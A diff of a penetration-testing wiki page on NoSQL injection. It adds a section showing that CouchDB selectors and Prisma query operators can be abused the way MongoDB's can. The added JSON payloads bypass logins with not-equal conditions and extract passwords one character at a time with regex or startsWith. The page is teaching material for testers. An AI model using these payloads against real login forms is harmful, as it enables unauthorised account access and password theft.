@@ -1,12 +1,12 @@
 ---
 description: >-
-  NoSQL databases are a type of database, where often objects are used instead
-  of SQL strings
+  NoSQL databases are a type of database where objects are used instead of SQL
+  strings. MongoDB is common but more are vulnerable
 ---
 
 # NoSQL Injection
 
-While SQL Injection in the traditional sense may not be possible, there are still some new opportunities for vulnerabilities that NoSQL introduces in **MongoDB**. Mainly the ability for the user to specify their own objects in a request, which may make the NoSQL database interpret the request as more than just a string.&#x20;
+While SQL Injection in the traditional sense may not be possible, there are still some new opportunities for vulnerabilities that NoSQL introduces in **MongoDB** (see [#similar-injections](nosql-injection.md#similar-injections "mention") for different databases). Mainly the ability for the user to specify their own objects in a request, which may make the NoSQL database interpret the request as more than just a string.&#x20;
 
 Often the goal is to bypass some login screen, by returning an always-true request. Sometimes you want to get more specific records or try to extract data.&#x20;
 
@@ -450,5 +450,66 @@ Another simple way to make one statement true without many special characters:
 For more payloads for the same idea see [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads).
 
 {% hint style="info" %}
-**Note**: While it seems we are injecting into server-side JavaScript code, this language from MongoDB is very restricted and in modern versions does **not** have much use for attackers. However, in **very old** versions it might be possible to get [Remote Code Execution](https://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/) from this.&#x20;
+**Note**: While it seems we are injecting into server-side JavaScript code, this language from MongoDB is very restricted and in modern versions does **not** have much use for attackers. However, in **very old** versions it might be possible to get [Remote Code Execution](https://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/) from this
+{% endhint %}
+
+## Similar Injections
+
+With these ORM solutions becoming more popular, and developers forgetting it's possible to create object structures in most frameworks with your request, many different databases are vulnerable in a similar way. While NoSQL Injection on MongoDB is the most well-known, the idea of using operators like `$ne` or `$regex` are not exclusive to it, and might exist just with different names. be sure to check out the documentation if you are unsure.&#x20;
+
+### Apache CouchDB
+
+See the [Selector Syntax](https://docs.couchdb.org/en/stable/api/database/find.html#selector-syntax) for a full guide. Anywhere the `$` operators can be used just **like with MongoDB**, there is basically no difference in attacking:
+
+{% code title="Login Bypass" %}
+```json
+{
+  "username": "admin",
+  "password": {
+    "$ne": "wrong"
+  }
+}
+```
+{% endcode %}
+
+{% code title="Regex Extraction" %}
+```json
+{
+  "username": "admin",
+  "password": {
+    "$regex": "^a"
+  }
+}
+```
+{% endcode %}
+
+### Prisma
+
+See [Filter Conditions and Operators](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#filter-conditions-and-operators) for a full list. Similar to MongoDB, the common [Prisma](https://www.prisma.io/) ORM allows using operators anywhere in your query object. The naming scheme is plain and can only be used when Prisma expects it, like when you open brackets on what should be a string. \
+The functionality is basically the same as MongoDB, just with some other names:
+
+{% code title="Login Bypass" %}
+```json
+{
+  "username": "admin",
+  "password": {
+    "not": "wrong"
+  }
+}
+```
+{% endcode %}
+
+{% code title="Regex Extraction" %}
+```json
+{
+  "username": "admin",
+  "password": {
+    "startsWith": "a"
+  }
+}
+```
+{% endcode %}
+
+{% hint style="info" %}
+You can get creative with [`OR`](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#or) and [`startsWith`](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#startswith) operators to specify half of the possibilities like in [#regex-binary-search](nosql-injection.md#regex-binary-search "mention") to achieve the optimized performance again
 {% endhint %}
